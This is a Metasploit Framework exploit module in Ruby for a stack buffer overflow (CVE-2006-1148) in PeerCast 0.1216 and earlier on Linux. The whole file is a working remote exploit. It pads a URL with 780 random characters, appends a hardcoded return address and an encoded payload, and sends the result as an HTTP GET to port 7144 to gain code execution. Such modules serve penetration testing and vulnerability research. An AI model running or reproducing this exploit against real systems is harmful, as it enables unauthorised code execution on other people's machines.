##
# $Id: peercast_url.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PeerCast <= 0.1216 URL Handling Buffer Overflow (linux)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in PeerCast <= v0.1216.
				The vulnerability is caused due to a boundary error within the
				handling of URL parameters.
			},
			'Author'         => [ 'MC' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2006-1148'],
					['OSVDB', '23777'],
					['BID', '17040'],
					['URL', 'http://www.infigo.hr/in_focus/INFIGO-2006-03-01'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 200,
					'BadChars' => "\x00\x0a\x0d\x20\x0d\x2f\x3d\x3b",
					'MinNops'  => 64,
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Targets'        =>
				[
					['PeerCast v0.1212 Binary', { 'Ret' => 0x080922f7 }],
				],
			'DisclosureDate' => 'Mar 8 2006'))

		register_options([
			Opt::RPORT(7144)
		], self.class)
	end

	def exploit
		connect

		pat = rand_text_alphanumeric(780)
		pat << [target.ret].pack('V')
		pat << payload.encoded

		uri = '/stream/?' + pat

		res = "GET #{uri} HTTP/1.0\r\n\r\n"

		print_status("Trying target address 0x%.8x..." % target.ret)
		sock.put(res)

		handler
		disconnect
	end

end